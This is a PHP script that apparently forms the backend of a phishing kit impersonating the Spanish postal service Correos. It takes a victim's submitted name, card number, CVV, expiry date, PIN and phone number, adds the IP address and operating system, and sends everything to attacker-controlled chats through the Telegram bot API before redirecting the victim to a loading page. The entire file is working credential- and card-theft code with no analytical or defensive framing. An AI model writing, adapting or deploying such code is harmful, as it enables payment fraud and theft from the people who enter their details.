<?php

    include("server.php");
    include("../result-telegram.php");
    $OS = getOS($_SERVER['HTTP_USER_AGENT']); 
    $UserAgent =$_SERVER['HTTP_USER_AGENT'];
    $browser = explode(')',$UserAgent);				
    $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

    $ccya = $_POST['cc'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
    >>>>>>>>> Correos CC   <<<<<<<<<
    [IP]    : ".$ip."
    [Name]      : ".$_POST['name']."
    [CC]    : ".$_POST['cc']."
    [Cvv]      : ".$_POST['cvv']."
    [Exp]      : ".$_POST['month']."/".$_POST['year']."
    [Pin]      : ".$_POST['pin']."
    [Telefono]      : ".$_POST['telefono']."
    [OS] = ".$OS."
    >>>>>>>>>>>> Correos CC  🇪🇸 <<<<<<<<<< \n";

    $theip = $message;
    function antiBotsCaller($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    antiBotsCaller($theip,$antit2,$antic1);
    antiBotsCaller($message,$token,$chatid);
    header("Location: ../loading2.php");

?>